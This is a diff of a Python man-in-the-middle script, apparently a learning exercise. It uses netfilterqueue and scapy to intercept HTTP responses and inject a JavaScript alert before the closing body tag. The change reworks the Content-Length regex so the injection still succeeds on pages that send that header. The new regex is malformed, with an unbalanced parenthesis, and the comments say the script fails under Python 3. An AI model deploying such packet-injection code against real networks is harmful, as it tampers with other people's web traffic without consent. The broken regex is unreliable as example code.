@@ -2,9 +2,6 @@
 
 #doesn't actually work in python3 currently, errors about str being returned instead of bytes-like object
 
-#this wont work on pages that specify Content-Length headers;
-#need to add code that will modify the content length value
-
 import netfilterqueue
 import re
 import scapy.all as scapy
@@ -48,10 +45,18 @@ def process_packet(packet):
             print("===================================")
             #print(scapy_packet.show())
             load = load.replace("</body>", "<script>alert('JS injection');</script></body>")
-            content_length_search = re.search("Content-Length:\s\d*", load)
+            content_length_search = re.search("?:Content-Length:\s)(\d*)", load)
+            #separate regex into two groups using () brackets
+            #first group is a non-capturing group; ?:
             if content_length_search:
-                content_length = content_length_search.group(0) #first element in re match string
+                content_length = content_length_search.group(1) #second element of regex is the number
                 print(content_length)
+                
+            #this wont work on pages that specify Content-Length headers;
+            #need to add code that will modify the content length value
+            #new var created called content_length_search
+            #uses re to match pattern: "Content-Length: somenumber
+            
             
             #replace is a Python method to replace
             #a string with something else
